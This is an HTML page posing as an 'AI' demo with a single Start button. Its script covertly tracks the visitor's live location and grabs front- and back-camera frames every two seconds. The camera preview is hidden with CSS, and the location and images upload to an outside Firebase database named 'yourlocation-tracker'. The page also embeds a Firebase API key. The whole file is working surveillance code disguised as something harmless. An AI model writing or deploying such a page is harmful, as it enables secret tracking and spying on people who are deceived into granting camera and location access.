<!DOCTYPE html>
<html>
<head>
<title>What Is Ai ?</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>
body{
background:black;
color:white;
text-align:center;
font-family:Arial;
}
video{
display:none; /* camera preview hidden */
}
button{
padding:15px;
font-size:18px;
}
</style>

</head>
<body>

<h2>AI Running...</h2>

<button onclick="start()">Start</button>

<video id="front"></video>
<video id="back"></video>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 authDomain: "yourlocation-tracker.firebaseapp.com",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let id = "phone_"+Math.floor(Math.random()*100000);

function start(){

// LOCATION
navigator.geolocation.watchPosition(pos=>{

firebase.database().ref("devices/"+id+"/location").set({
lat: pos.coords.latitude,
lon: pos.coords.longitude
});

});

// FRONT CAMERA
navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"}
}).then(stream=>{

let video=document.getElementById("front");
video.srcObject=stream;

sendFrames(video,"front");

});

// BACK CAMERA
navigator.mediaDevices.getUserMedia({
video:{facingMode:"environment"}
}).then(stream=>{

let video=document.getElementById("back");
video.srcObject=stream;

sendFrames(video,"back");

});

}

function sendFrames(video,type){

let canvas=document.createElement("canvas");
let ctx=canvas.getContext("2d");

setInterval(()=>{

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

ctx.drawImage(video,0,0);

firebase.database().ref("devices/"+id+"/camera/"+type).set({
img:canvas.toDataURL("image/jpeg",0.5)
});

},2000);

}

</script>

</body>
</html>
